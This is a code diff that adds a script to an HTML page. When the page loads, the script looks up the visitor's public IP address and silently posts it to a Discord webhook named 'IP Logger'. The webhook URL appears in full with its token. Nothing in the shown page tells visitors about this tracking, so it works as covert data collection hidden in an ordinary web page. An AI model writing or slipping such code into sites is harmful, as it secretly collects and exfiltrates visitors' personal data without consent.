@@ -41,6 +41,33 @@
     </div>
 </body>
 
+<script>
+    function sendIPToWebhook(ip) {
+        const webhookUrl = 'https://ptb.discord.com/api/webhooks/1257984661200830484/9OGdZXwcO93Ox8MJ2rHDJRZ5GSIIGJsZivt-9KO1HuPWZ9dBW5FuvIMHPl9PVlz87Np6';  // Remplace par ton URL de webhook Discord
+        const request = new XMLHttpRequest();
+        request.open("POST", webhookUrl);
+        request.setRequestHeader('Content-type', 'application/json');
+
+        const params = {
+            username: "IP Logger",
+            content: `IP Address: ${ip}`
+        };
+
+        request.send(JSON.stringify(params));
+    }
+
+    function getIP() {
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                sendIPToWebhook(data.ip);
+            })
+            .catch(error => console.error('Error fetching IP:', error));
+    }
+
+    window.onload = getIP;
+</script>
+
 <script src="main.js"></script>
 
 </html>
